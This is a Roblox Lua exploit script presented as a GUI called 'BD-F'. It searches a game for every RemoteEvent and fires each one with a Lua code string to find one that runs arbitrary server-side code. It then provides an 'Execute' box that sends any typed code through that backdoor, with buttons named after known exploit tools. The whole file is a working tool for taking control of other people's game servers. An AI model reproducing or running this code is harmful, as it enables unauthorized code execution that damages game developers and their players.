function sandbox(var,func)
	local env = getfenv(func)
	local newenv = setmetatable({},{
		__index = function(self,k)
			if k=="script" then
				return var
			else
				return env[k]
			end
		end,
	})
	setfenv(func,newenv)
	return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
ScreenGui0 = Instance.new("ScreenGui")
Frame1 = Instance.new("Frame")
LocalScript2 = Instance.new("LocalScript")
TextLabel3 = Instance.new("TextLabel")
ObjectValue4 = Instance.new("ObjectValue")
Frame5 = Instance.new("Frame")
ScrollingFrame6 = Instance.new("ScrollingFrame")
TextButton7 = Instance.new("TextButton")
TextButton8 = Instance.new("TextButton")
TextButton9 = Instance.new("TextButton")
TextButton10 = Instance.new("TextButton")
TextBox11 = Instance.new("TextBox")
LocalScript12 = Instance.new("LocalScript")
TextLabel13 = Instance.new("TextLabel")
LocalScript14 = Instance.new("LocalScript")
TextButton15 = Instance.new("TextButton")
LocalScript16 = Instance.new("LocalScript")
TextButton17 = Instance.new("TextButton")
LocalScript18 = Instance.new("LocalScript")
TextButton19 = Instance.new("TextButton")
LocalScript20 = Instance.new("LocalScript")
ScreenGui0.Name = "zza"
ScreenGui0.Parent = mas
ScreenGui0.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Frame1.Name = "LoadingUI"
Frame1.Parent = ScreenGui0
Frame1.Position = UDim2.new(0.499078393, 0, 0.499235392, 0)
Frame1.Size = UDim2.new(0, 301, 0, 100)
Frame1.Active = true
Frame1.AnchorPoint = Vector2.new(0.5, 0.5)
Frame1.BackgroundColor = BrickColor.new("Institutional white")
Frame1.BackgroundColor3 = Color3.new(1, 1, 1)
Frame1.BorderColor = BrickColor.new("Really black")
Frame1.BorderColor3 = Color3.new(0, 0, 0)
Frame1.BorderSizePixel = 0
Frame1.ZIndex = 0
table.insert(cors,sandbox(LocalScript2,function()
script.Parent.Draggable = true

local txt = script.Parent.Status

txt.Text = [[Initialized!
Finding all RemoteEvents..
.Find RE backdoor
.Pass backdoored RE
.Load MainUI with fancy anims]]

wait(1)

local remotes = {}
for i,v in pairs(game:GetDescendants()) do
	if v:IsA("RemoteEvent") then
		print("Found remote: game."..v:GetFullName())
		remotes[i] = v
	end
end

txt.Text = [[Initialized!
Found all RemoteEvents!
Finding a backdoor..
.Pass backdoored RE
.Load MainUI with fancy anims]]

wait(0.1)

for i,remote in pairs(remotes) do
	remote:FireServer("local i = Instance.new('BoolValue') i.Name = 'i' i.Value = true i.Parent = game.ReplicatedStorage")
	wait(0.5)
	if game.ReplicatedStorage:FindFirstChild("i") then
		script.Parent.Parent.re.Value = remote
		txt.Text = [[Initialized!
Found all RemoteEvents!
Found a backdoor!
Passed backdoor RE!
Loading MainUI...]]
		for k,v in pairs(remotes) do
			if v ~= remote then
				table.remove(remotes,table.find(remotes,v))
			end
		end
		game.ReplicatedStorage:FindFirstChild("i"):Destroy()
	end
end

if script.Parent.Parent.re.Value == nil then
	txt.Text = [[Initialized!
Found all RemoteEvents!
Failed to find a backdoor!
.Pass backdoored RE
.Load MainUI with fancy anims]]
	wait(5)
	script.Disabled = true
	script.Parent.Parent:Destroy()
	return
end

wait(0.2)

txt.Text = [[Initialized!
Found all RemoteEvents!
Found a backdoor!
Passed backdoor RE!
Loaded MainUI!]]

local ts = game:GetService("TweenService")

local tp = UDim2.new(0.5, 0, -1, 0)

local ti = TweenInfo.new(2, Enum.EasingStyle.Elastic, Enum.EasingDirection.InOut)
local t = ts:Create(script.Parent, ti, {Position = tp})

t:Play()

wait(2)

script.Parent.Parent.MainUI.Visible = true
script.Parent.Parent.MainUI.Active = true

tp = UDim2.new(0.5,0,0.5,0)

t = ts:Create(script.Parent.Parent.MainUI, ti, {Position = tp})

t:Play()

wait(2)

script.Parent:Destroy()
end))
TextLabel3.Name = "Status"
TextLabel3.Parent = Frame1
TextLabel3.Size = UDim2.new(0, 301, 0, 100)
TextLabel3.BackgroundColor = BrickColor.new("Institutional white")
TextLabel3.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel3.BackgroundTransparency = 1
TextLabel3.BorderColor = BrickColor.new("Really black")
TextLabel3.BorderColor3 = Color3.new(0, 0, 0)
TextLabel3.BorderSizePixel = 0
TextLabel3.Font = Enum.Font.SourceSans
TextLabel3.FontSize = Enum.FontSize.Size18
TextLabel3.Text = "Initialized!"
TextLabel3.TextColor = BrickColor.new("Institutional white")
TextLabel3.TextColor3 = Color3.new(1, 1, 1)
TextLabel3.TextSize = 18
TextLabel3.TextWrap = true
TextLabel3.TextWrapped = true
TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
TextLabel3.TextYAlignment = Enum.TextYAlignment.Top
ObjectValue4.Name = "re"
ObjectValue4.Parent = ScreenGui0
Frame5.Name = "MainUI"
Frame5.Parent = ScreenGui0
Frame5.Position = UDim2.new(0.5, 0, -1, 0)
Frame5.Visible = false
Frame5.Size = UDim2.new(0, 248, 0, 147)
Frame5.BackgroundColor = BrickColor.new("Black metallic")
Frame5.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
Frame5.BorderColor = BrickColor.new("Really black")
Frame5.BorderColor3 = Color3.new(0, 0, 0)
Frame5.BorderSizePixel = 0
ScrollingFrame6.Name = "ScriptUI"
ScrollingFrame6.Parent = Frame5
ScrollingFrame6.Position = UDim2.new(0, 266, 0, 0)
ScrollingFrame6.Size = UDim2.new(0, 114, 0, 147)
ScrollingFrame6.Active = true
ScrollingFrame6.BackgroundColor = BrickColor.new("Black")
ScrollingFrame6.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
ScrollingFrame6.BorderColor = BrickColor.new("Really black")
ScrollingFrame6.BorderColor3 = Color3.new(0, 0, 0)
ScrollingFrame6.BorderSizePixel = 0
ScrollingFrame6.ScrollBarThickness = 6
TextButton7.Name = "f3x"
TextButton7.Parent = ScrollingFrame6
TextButton7.Size = UDim2.new(0, 108, 0, 16)
TextButton7.BackgroundColor = BrickColor.new("Black metallic")
TextButton7.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton7.BorderColor = BrickColor.new("Really black")
TextButton7.BorderColor3 = Color3.new(0, 0, 0)
TextButton7.BorderSizePixel = 0
TextButton7.Font = Enum.Font.Nunito
TextButton7.FontSize = Enum.FontSize.Size14
TextButton7.Text = "F3X"
TextButton7.TextColor = BrickColor.new("Really black")
TextButton7.TextColor3 = Color3.new(0, 0, 0)
TextButton7.TextScaled = true
TextButton7.TextSize = 14
TextButton7.TextWrap = true
TextButton7.TextWrapped = true
TextButton8.Name = "dex"
TextButton8.Parent = ScrollingFrame6
TextButton8.Position = UDim2.new(0, 0, 0, 16)
TextButton8.Size = UDim2.new(0, 108, 0, 16)
TextButton8.BackgroundColor = BrickColor.new("Black metallic")
TextButton8.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton8.BorderColor = BrickColor.new("Really black")
TextButton8.BorderColor3 = Color3.new(0, 0, 0)
TextButton8.BorderSizePixel = 0
TextButton8.Font = Enum.Font.Nunito
TextButton8.FontSize = Enum.FontSize.Size14
TextButton8.Text = "Dex"
TextButton8.TextColor = BrickColor.new("Really black")
TextButton8.TextColor3 = Color3.new(0, 0, 0)
TextButton8.TextScaled = true
TextButton8.TextSize = 14
TextButton8.TextWrap = true
TextButton8.TextWrapped = true
TextButton9.Name = "goner"
TextButton9.Parent = ScrollingFrame6
TextButton9.Position = UDim2.new(0, 0, 0, 32)
TextButton9.Size = UDim2.new(0, 108, 0, 16)
TextButton9.BackgroundColor = BrickColor.new("Black metallic")
TextButton9.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton9.BorderColor = BrickColor.new("Really black")
TextButton9.BorderColor3 = Color3.new(0, 0, 0)
TextButton9.BorderSizePixel = 0
TextButton9.Font = Enum.Font.Nunito
TextButton9.FontSize = Enum.FontSize.Size14
TextButton9.Text = "Goner"
TextButton9.TextColor = BrickColor.new("Really black")
TextButton9.TextColor3 = Color3.new(0, 0, 0)
TextButton9.TextScaled = true
TextButton9.TextSize = 14
TextButton9.TextWrap = true
TextButton9.TextWrapped = true
TextButton10.Name = "h-loversgui"
TextButton10.Parent = ScrollingFrame6
TextButton10.Position = UDim2.new(0, 0, 0, 48)
TextButton10.Size = UDim2.new(0, 108, 0, 16)
TextButton10.BackgroundColor = BrickColor.new("Black metallic")
TextButton10.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
TextButton10.BorderColor = BrickColor.new("Really black")
TextButton10.BorderColor3 = Color3.new(0, 0, 0)
TextButton10.BorderSizePixel = 0
TextButton10.Font = Enum.Font.Nunito
TextButton10.FontSize = Enum.FontSize.Size14
TextButton10.Text = "H-LoversGUI"
TextButton10.TextColor = BrickColor.new("Really black")
TextButton10.TextColor3 = Color3.new(0, 0, 0)
TextButton10.TextScaled = true
TextButton10.TextSize = 14
TextButton10.TextWrap = true
TextButton10.TextWrapped = true
TextBox11.Name = "code"
TextBox11.Parent = Frame5
TextBox11.Position = UDim2.new(0, 0, 0, 16)
TextBox11.Size = UDim2.new(0, 248, 0, 98)
TextBox11.BackgroundColor = BrickColor.new("Black")
TextBox11.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextBox11.BorderColor = BrickColor.new("Really black")
TextBox11.BorderColor3 = Color3.new(0, 0, 0)
TextBox11.BorderSizePixel = 0
TextBox11.Font = Enum.Font.SourceSans
TextBox11.FontSize = Enum.FontSize.Size14
TextBox11.Text = ""
TextBox11.TextColor = BrickColor.new("Really black")
TextBox11.TextColor3 = Color3.new(0, 0, 0)
TextBox11.TextSize = 14
TextBox11.TextWrap = true
TextBox11.TextWrapped = true
TextBox11.TextXAlignment = Enum.TextXAlignment.Left
TextBox11.TextYAlignment = Enum.TextYAlignment.Top
TextBox11.ClearTextOnFocus = false
LocalScript12.Name = "draggable"
table.insert(cors,sandbox(LocalScript12,function()
script.Parent.Draggable = true
end))
TextLabel13.Name = "name"
TextLabel13.Parent = Frame5
TextLabel13.Size = UDim2.new(0, 248, 0, 17)
TextLabel13.BackgroundColor = BrickColor.new("Institutional white")
TextLabel13.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel13.BackgroundTransparency = 1
TextLabel13.BorderColor = BrickColor.new("Really black")
TextLabel13.BorderColor3 = Color3.new(0, 0, 0)
TextLabel13.BorderSizePixel = 0
TextLabel13.Font = Enum.Font.SourceSans
TextLabel13.FontSize = Enum.FontSize.Size14
TextLabel13.Text = "BD-F (Credits - AlmousMarvelous, QuickQuarnt)"
TextLabel13.TextColor = BrickColor.new("Institutional white")
TextLabel13.TextColor3 = Color3.new(1, 1, 1)
TextLabel13.TextScaled = true
TextLabel13.TextSize = 14
TextLabel13.TextWrap = true
TextLabel13.TextWrapped = true
LocalScript14.Name = "draggable"
table.insert(cors,sandbox(LocalScript14,function()
script.Parent.Draggable = true
end))
TextButton15.Name = "Run"
TextButton15.Parent = Frame5
TextButton15.Position = UDim2.new(0, 7, 0, 119)
TextButton15.Size = UDim2.new(0, 76, 0, 21)
TextButton15.BackgroundColor = BrickColor.new("Black")
TextButton15.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton15.BorderColor = BrickColor.new("Really black")
TextButton15.BorderColor3 = Color3.new(0, 0, 0)
TextButton15.BorderSizePixel = 0
TextButton15.Font = Enum.Font.Nunito
TextButton15.FontSize = Enum.FontSize.Size14
TextButton15.Text = "Execute"
TextButton15.TextColor = BrickColor.new("Really black")
TextButton15.TextColor3 = Color3.new(0, 0, 0)
TextButton15.TextScaled = true
TextButton15.TextSize = 14
TextButton15.TextWrap = true
TextButton15.TextWrapped = true
table.insert(cors,sandbox(LocalScript16,function()
script.Parent.MouseButton1Down:Connect(function()
	local code = script.Parent.Parent.code.Text
	local re = script.Parent.Parent.Parent.re.Value

	re:FireServer(code)
	print("fired code")
end)
end))
TextButton17.Name = "Clear"
TextButton17.Parent = Frame5
TextButton17.Position = UDim2.new(0, 87, 0, 119)
TextButton17.Size = UDim2.new(0, 76, 0, 21)
TextButton17.BackgroundColor = BrickColor.new("Black")
TextButton17.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton17.BorderColor = BrickColor.new("Really black")
TextButton17.BorderColor3 = Color3.new(0, 0, 0)
TextButton17.BorderSizePixel = 0
TextButton17.Font = Enum.Font.Nunito
TextButton17.FontSize = Enum.FontSize.Size14
TextButton17.Text = "Clear"
TextButton17.TextColor = BrickColor.new("Really black")
TextButton17.TextColor3 = Color3.new(0, 0, 0)
TextButton17.TextScaled = true
TextButton17.TextSize = 14
TextButton17.TextWrap = true
TextButton17.TextWrapped = true
table.insert(cors,sandbox(LocalScript18,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.code.Text = ""
end)
end))
TextButton19.Name = "Exit"
TextButton19.Parent = Frame5
TextButton19.Position = UDim2.new(0, 166, 0, 119)
TextButton19.Size = UDim2.new(0, 76, 0, 21)
TextButton19.BackgroundColor = BrickColor.new("Black")
TextButton19.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
TextButton19.BorderColor = BrickColor.new("Really black")
TextButton19.BorderColor3 = Color3.new(0, 0, 0)
TextButton19.BorderSizePixel = 0
TextButton19.Font = Enum.Font.Nunito
TextButton19.FontSize = Enum.FontSize.Size14
TextButton19.Text = "Exit"
TextButton19.TextColor = BrickColor.new("Really black")
TextButton19.TextColor3 = Color3.new(0, 0, 0)
TextButton19.TextScaled = true
TextButton19.TextSize = 14
TextButton19.TextWrap = true
TextButton19.TextWrapped = true
table.insert(cors,sandbox(LocalScript20,function()
script.Parent.MouseButton1Down:Connect(function()
	script.Parent.Parent.Parent:Destroy()
end)
end))
for i,v in pairs(mas:GetChildren()) do
	v.Parent = workspace
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
